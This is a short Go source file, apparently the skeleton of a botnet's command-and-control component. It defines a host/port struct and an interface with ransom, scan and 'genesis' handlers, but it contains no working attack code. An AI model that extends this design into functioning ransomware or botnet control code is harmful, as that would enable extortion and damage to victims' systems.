package botnet

import "fmt"

//CommandControl is
type CommandControl struct {
	Port string
	Host string
}

//Addr is
func (c *CommandControl) Addr() string {
	return fmt.Sprintf("%s:%s", c.Host, c.Port)
}

//Commander is
type Commander interface {
	Listen()

	RansomCmd(addr string) error
	ScanCmd(addr string) error

	HandleGenesis()
	HandleRansomComplete()
}
